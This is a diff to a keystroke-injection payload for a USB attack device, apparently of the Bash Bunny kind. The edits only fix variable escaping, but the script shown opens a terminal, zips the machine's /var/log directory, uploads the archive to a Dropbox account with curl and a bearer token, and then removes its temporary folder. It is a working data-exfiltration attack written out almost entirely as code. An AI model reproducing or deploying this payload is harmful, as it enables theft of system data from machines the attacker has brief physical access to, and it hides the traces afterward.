@@ -17,54 +17,54 @@ ATTACKMODE HID
 # VARIABLES
 # - Set here your Dropbox access TOKEN
 DROPBOX_ACCESS_TOKEN='example'
-# - Change, if you want, the folder path. Pay attention to the fact that this payload is set up to know the user name of the machines, which is identified via the variable $USER_NAME
-FOLDER_PATH='/home/$USER_NAME/tmp/'
+# - Change, if you want, the folder path. Pay attention to the fact that this payload is set up to know the user name of the machines, which is identified via the variable USER_NAME
+FOLDER_PATH='/home/\$USER_NAME/tmp/'
 # - Change, if you want, the log path
 LOG_PATH='/var/log/'
 
 QUACK DELAY 1500
 QUACK CTRL-ALT t
 QUACK DELAY 500
-QUACK STRING USER_NAME=$(whoami)
+QUACK STRING USER_NAME=\$(whoami)
 QUACK ENTER
 
 # Create random num
 QUACK DELAY 500
-QUACK STRING RANDOM=$(shuf -i 1-999999999999 -n 1)
+QUACK STRING RANDOM=\$(shuf -i 1-999999999999 -n 1)
 QUACK ENTER
 
 # Folder path
 QUACK DELAY 500
-QUACK STRING TMP_FOLDER_PATH=$(mktemp -d -p '$FOLDER_PATH' prefix-XXXXXXXXXX)
+QUACK STRING TMP_FOLDER_PATH=\$(mktemp -d -p '$FOLDER_PATH' prefix-XXXXXXXXXX)
 QUACK ENTER
 
 # Zip path
 QUACK DELAY 500
-QUACK STRING ZIP_NAME='$RANDOM.zip'
+QUACK STRING ZIP_NAME='\$RANDOM.zip'
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING ZIP_PATH='$TMP_FOLDER_PATH/$ZIP_NAME'
+QUACK STRING ZIP_PATH='\$TMP_FOLDER_PATH/\$ZIP_NAME'
 QUACK ENTER
 
 QUACK DELAY 500
-QUACK STRING zip -r '$ZIP_PATH' '$LOG_PATH'
+QUACK STRING zip -r '\$ZIP_PATH' '$LOG_PATH'
 QUACK ENTER
 
 # Delay of zipping operation - it depends
 QUACK DELAY 10000
 
 QUACK DELAY 500
-QUACK STRING DROPBOX_FOLDER='/$ZIP_NAME'
+QUACK STRING DROPBOX_FOLDER='/\$ZIP_NAME'
 QUACK ENTER
 
 # Send to Dropbox function
 QUACK DELAY 500
-QUACK STRING curl -X POST 'https://content.dropboxapi.com/2/files/upload' --header 'Authorization: Bearer $DROPBOX_ACCESS_TOKEN' --header 'Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}' --header 'Content-Type: application/octet-stream' --data-binary '@$ZIP_PATH'
+QUACK STRING curl -X POST 'https://content.dropboxapi.com/2/files/upload' --header 'Authorization: Bearer $DROPBOX_ACCESS_TOKEN' --header 'Dropbox-API-Arg: {\"path\": \"\$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}' --header 'Content-Type: application/octet-stream' --data-binary '@\$ZIP_PATH'
 QUACK ENTER
 
 # Send timing - it depends
 QUACK DELAY 5000
 
 QUACK DELAY 500
-QUACK STRING rm -rf '$TMP_FOLDER_PATH'
+QUACK STRING rm -rf '\$TMP_FOLDER_PATH'
 QUACK ENTER
